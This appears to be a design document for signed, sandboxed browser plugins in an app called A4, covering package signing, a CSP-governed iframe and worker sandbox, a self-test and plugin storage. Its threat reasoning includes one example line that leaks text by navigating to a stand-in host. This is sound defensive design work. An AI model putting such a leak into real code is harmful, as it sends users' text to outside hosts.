# Design: add-signed-plugins

## Context

See proposal.md for why, and the spec deltas for behavior. The code this
builds on:

| Piece | Where | What changes |
| --- | --- | --- |
| Registration | `lib/models/manifest.ts` (`MANIFEST`, `definePlugin`, `BUNDLED_CARDS`), `registry.ts` (`createHost`) | Bundled plugins stay here. Installed ones register beside them from a store |
| The host | `lib/models/host.ts`: `register(entry)` freezes the card and derives the egress policy; `#client` checks `Describe`; `#guardEgress` consumes consent; `score` validates planes and spans; `transform` lays out attempts | Unchanged rules. It learns to unregister, for Remove |
| The wire | `proto/a4/v1/rpc.proto` (`RpcFrame`), `lib/models/worker-transport.ts` (`connectPort`, `servePort`, `fromWorker`) | Reused as is. The sandbox is a new `PortLike` |
| In-browser plugin today | `plugins/semantic/connect.ts`: `new Worker(new URL("./worker.ts"))`, and the worker downloads its own model | Installed plugins can't download: the host fetches their files |
| Credentials | `credentials.ts` (`CredentialStore`, in memory), and `PluginContext.credential(kind)` for in-process plugins | Sent to a sandboxed plugin when it starts |
| UI | `components/ModelsPanel.tsx` (cards from `BUNDLED_CARDS`, a slot per plugin), `useModels.ts`, `workbench/useSemanticLens.ts` (one `ScoreSchedule` for Semantic), `FitToPage.tsx` + `lib/models/fit-job.ts` | Cards come from the host's list. One lens hook for any plane. One pen job for any pen |
| Element | `lib/render/element/contract.ts`: a lens is a built-in id or `model:<plane>` | Installed planes use a key unique across plugins |
| Ports | `lib/platform/`: `sha256`, `IdbHandleStore`; Biome denies `crypto` and `indexedDB` outside it | Ed25519 verification and a plugin store live here |
| Layers | `.dependency-cruiser.cjs`: `models` may use `page, platform, persist, analysis, tensor` (and `gen`); UI reaches plugins only through the registry | Same rules. The sandbox and the store sit behind the registry |
| CSP | None today: no header and no meta tag in the app | The app gets none. Only the sandbox frame has a policy |

## Goals / Non-Goals

**Goals**
- **The card is the policy.** What a signed card says about network access
  is what the browser enforces on the plugin, not what the plugin promises.
- **One host, one set of rules.** Installed plugins go through the same
  `ModelHost` calls, consent broker, fit loop, and result checks as bundled
  ones.
- **Fail closed.** If this browser can't enforce the sandbox, installed
  plugins don't run, and A4 says why.

**Non-Goals**
- Protecting a plugin's code or model files from the author. They are the
  author's files in the author's browser.
- Stopping a remote plugin from misusing text it was given with consent.
  The host it names receives that text. The sandbox only keeps it from going
  anywhere else.
- Cross-browser automation. The sandbox is proven in Chromium here.
  Firefox and Safari rely on the runtime self-test (Decision 4).

## Decisions

### 1. The package is a protobuf message, signed over its manifest bytes

`proto/a4/v1/plugin.proto`:

```proto
message PluginPackage {
  bytes manifest = 1;   // a serialized PluginManifest, exactly as signed
  bytes signature = 2;  // Ed25519, 64 bytes
  bytes code = 3;       // one script that imports nothing
}
message PluginManifest {
  ModelCard card = 1;
  Publisher publisher = 2;
  string code_digest = 3;          // urn:sha256:<hex>
  repeated ModelFile files = 4;
  google.protobuf.Timestamp signed_at = 5;
}
message Publisher { string name = 1; bytes public_key = 2; }  // 32 bytes
message ModelFile { string url = 1; uint64 size = 2; string digest = 3; }
message PluginStart {                // host → plugin, before any call
  repeated StartFile files = 1;
  map<string, string> credentials = 2;
}
message StartFile { string url = 1; bytes data = 2; }
message InstalledPlugin {            // one stored record
  bytes package = 1;
  string source_url = 2;             // empty when installed from a file
  google.protobuf.Timestamp installed_at = 3;
}
```

- **The manifest is kept as bytes.** It is signed as stored and never
  re-encoded, so protobuf's lack of a canonical encoding doesn't matter.
- **A context prefix.** The signature covers the ASCII string
  `a4.v1.PluginManifest\n` followed by the manifest bytes. A publisher key
  that signs anything else later (a postmark, say) can't have that signature
  replayed as a manifest's.
- **`.a4plugin`** is the file extension, and the media type is
  `application/vnd.a4.plugin`.
- **Alternatives:**
  - A zip with a JSON manifest. Rejected: it needs a canonical JSON and a
    zip parser in the trust path.
  - JWS or COSE. Rejected: they add a format for one signature over one
    blob.
  - Sigstore and keyless signing. Rejected: they need a network service and
    an identity provider, which is out of scope.

### 2. Ed25519 through Web Crypto, behind the platform port

- `lib/platform/digest.ts` gains `verifyEd25519(publicKey, signature, data)`
  through `crypto.subtle`. The browser and Node both provide it, so the app
  and `a4 plugin verify` share `lib/models/package.ts` (`readPackage`,
  `verifyPackage`).
- Signing happens only in the CLI. It uses `node:crypto` `sign(null, …)`
  with a PKCS#8 PEM key, written with mode 0600 by `keygen`.
- The fingerprint is `sha256(public_key)[0..16]`, shown as 8 groups of 4
  hex digits.
- **Alternative:** a JS Ed25519 library. Rejected: it adds a dependency to
  the trust path when the platform already provides one.

### 3. The sandbox: a blob worker inside a sandboxed `srcdoc` frame

The host never runs plugin code in a context that has the app's privileges.
For each installed plugin it starts:

1. **A frame:** a hidden `<iframe sandbox="allow-scripts">`, built from
   `srcdoc`. Without `allow-same-origin` its origin is opaque, so it has no
   storage, no cookies, and no access to the app.
2. **A policy:** the frame's first element is a CSP `<meta>` built from the
   frozen card:
   ```
   default-src 'none';
   script-src 'sha256-<bootstrap>' blob: 'wasm-unsafe-eval';
   worker-src blob:;
   connect-src 'none' | https://<destination_host>;
   ```
3. **A bootstrap:** the frame's one inline script, pinned by its hash. It
   accepts exactly one message from `parent`: the verified code bytes, the
   `PluginStart` bytes, and a `MessagePort`. It then makes a blob URL, starts
   a classic `Worker` from it, hands the worker the port and the start
   message, and relays the worker's `error` and `messageerror` events to the
   host.
4. **The worker:** the plugin's code runs here and only here. A worker whose
   URL is a blob inherits its creator's policy container, so the frame's CSP
   governs the worker's `fetch`, `WebSocket`, `EventSource`, `importScripts`,
   and nested workers.

**Why a worker, and not the frame itself:**
- A document can still leak by navigating itself
  (`location = "https://x/?" + text`), and CSP no longer restricts
  navigation.
- A document can open WebRTC connections, which CSP doesn't cover in every
  browser.
- A dedicated worker has neither.

**The host's side:**
- The host talks to the worker over the `MessagePort` with the existing
  `connectPort`, so `Describe`, `Score`, `Transform`, cancel, and the
  1-second failure rule all work unchanged.
- `sandbox.ts` implements `PortLike` with `onFailure` wired to the relayed
  errors. Teardown removes the frame, which ends the worker.

**Alternatives:**
- **A page served by the Worker with a CSP header.** It needs the server for
  every start (and offline caching), and a per-plugin header built from a
  query string.
- **A blob worker from the app page.** It would inherit the app's policy,
  and the app has none, and can't have a strict one, because Fit to page and
  Semantic repetition need the network.
- **A ShadowRealm or SES compartment.** Not shipped in browsers, and it
  doesn't govern the network.

### 4. A self-test before any installed plugin runs

On first use in a tab, the host starts a canary through the same sandbox
path, with `connect-src 'none'`. The canary's code tries
`fetch("data:text/plain,a4")` and a nested blob worker that tries the same.

- If either fetch succeeds, this browser isn't enforcing the policy on the
  worker. A4 then marks installed plugins as unavailable here ("This browser
  can't sandbox installed plugins"), and runs none of them.
- The canary makes no network request either way, since `data:` never
  leaves the browser.
- Bundled plugins are unaffected.

### 5. The host fetches model files; the plugin only receives them

An installed plugin has no network when it keeps text on the device, so it
can't run `Prepare` itself. The installed plugin's `connect` returns a client
wrapper:
- **`prepare`** downloads each manifest file from the main page (with
  `credentials: "omit"` and `referrerPolicy: "no-referrer"`), reports
  progress as `PrepareResponse`s, checks size and digest, and stores the
  bytes.
- **`status`** is ready when every file is stored and the sandbox is up.
- **Every other method** goes to the sandbox. The first call starts it with a
  `PluginStart` that carries the stored files and the plugin's credentials.

Changing a credential tears the sandbox down, so the next call starts with
the new value. Keys still live only in memory.

### 6. Installed plugins are stored in IndexedDB, and verified on every start

- **Storage:** `lib/platform/plugin-store.ts` adds `IdbPluginStore`, a
  database `a4-plugins` with two object stores:
  - `plugins`, keyed by id, holding `InstalledPlugin` bytes;
  - `files`, keyed by `urn:sha256:…`, holding the file bytes.

  A memory fake backs the Node tests. OPFS isn't used because the app falls
  back to local storage where OPFS is missing, and IndexedDB is the only
  store large enough everywhere A4 runs.
- **The pin is the stored package's publisher key.** No separate trust
  store exists to drift from the code it vouches for.
- **On every start,** the host re-runs `verifyPackage` on the stored bytes
  and checks the file digests. A failure marks the plugin damaged and leaves
  it unregistered.
- **Remove** deletes the record and any file no other installed plugin
  lists.

### 7. Registration: one host, a stable id space

- `registry.ts` builds the host from `MANIFEST`, then registers each
  verified installed plugin with an `entry.connect` that makes the sandbox
  client.
- `ModelHost` gains `unregister(id)`, which closes the plugin's client and
  forgets its credentials and consent.
- **Ids:** an installed card's id must match `^[a-z0-9]+([.-][a-z0-9]+)*$`,
  in at most 64 characters, and must not be a bundled id. The publisher's
  key pins that id in the store.
- **The UI's list:** `BUNDLED_CARDS` stays for code that must not load the
  host. The Models section reads `host.list()` plus each installed plugin's
  publisher, fingerprint, badge, and source.

### 8. Known publishers are a constant in the app

`lib/models/publishers.ts` exports `KNOWN_PUBLISHERS: readonly
{ name, publicKey }[]`, and it ships empty.

- **The badge shows when the signing key is on the list,** and the shown
  name is the list's name, not the package's.
- **It is code, not a downloaded list.** Adding a publisher is a reviewed
  change to the repository, which keeps the trust decision in version
  control.
- `a4 plugin verify` reads the same list.

### 9. Generic lenses and pens in the UI

- **Lenses:** `useSemanticLens` becomes `useModelLens`.
  - It keeps one `ScoreSchedule` keyed by slot and lens.
  - An on-device overlay rescores after a 1,500 ms pause in typing.
  - A remote overlay scores only on request, through the consent dialog.
  - Semantic repetition becomes one entry. Its summary stays in its slot.
- **Lens keys:** every plane's key is `model:<plugin id>/<plane name>`, as
  Semantic's already was. A `/` can't appear in an id, so two plugins'
  planes never collide.
- **Pens:** `fit-job.ts` becomes `pen-job.ts`.
  - It holds one job per pen. Fit to page keeps its own UI and its " (fit)"
    suffix.
  - An installed pen gets a generic row: instruction picker, Run, progress,
    and Cancel.
  - Its result is named "<source> (<pen name>)", made unique.

### 10. Publisher commands and examples

- **The commands:** `cli/plugin.ts` adds `a4 plugin keygen | pack | verify`.
  - `pack` reads a card as JSON (`toJson` form of `ModelCard`), the code
    file, the key, and `--file <path>=<https url>` pairs.
  - It runs the same `checkPackagedCard` that install runs.
- **The kit:** `lib/models/kit/serve.ts` reads the `PluginStart` message,
  exposes the files and credentials, and calls `servePort`.
- **The examples:** `examples/plugins/word-length/` and
  `examples/plugins/hard-wrap/` import the kit by relative path.
  `scripts/build-example-plugins.ts` bundles each one with Vite into a
  single IIFE script, then packs it with a throwaway key made in the
  scratch output folder. The test key is never committed.

## Risks / Trade-offs

- **[Risk] A browser doesn't apply the frame's CSP to the blob worker, or
  refuses blob workers in an opaque origin** (historically, Safari).
  - The self-test in Decision 4 fails closed, and installed plugins are
    unavailable in that browser.
  - The first task proves the sandbox in Chromium with a hostile plugin
    before anything else is built on it.
- **[Risk] A remote plugin keeps text from one consented call and sends it
  later.** It can reach only the host that already received that text with
  consent, and it has no storage to keep it past the tab.
- **[Risk] `wasm-unsafe-eval` lets a plugin compile WebAssembly.** The
  WebAssembly runs inside the same worker and under the same `connect-src`.
  Compiling code doesn't open a network path.
- **[Risk] Large model files are copied into `PluginStart`.** Encoding a
  file into the message copies it once. That's fine for tens of megabytes. If
  a plugin needs hundreds, a follow-up can transfer `ArrayBuffer`s beside
  the message.
- **[Trade-off] The known-publisher list starts empty,** so the badge ships
  as a mechanism, and every first install shows "Unknown publisher". That's
  accurate until a publisher is reviewed in.
- **[Trade-off] No key rotation.** A publisher who loses a key ships under a
  new id. Pinning by id makes this loud, which is the point.
- **[Risk] A URL install reveals the author's IP address to the publisher.**
  It happens only on the author's explicit action, with no cookies and no
  referrer, and no page text.

## Migration Plan

- **Nothing to migrate.** No plugin is installed until an author installs
  one.
- **Bundled plugins keep their ids, cards, and lenses.** Semantic's lens key
  is unchanged.
- **Rollback:** reverting the change leaves an unused `a4-plugins` IndexedDB
  database in browsers that installed something. It holds no page text.
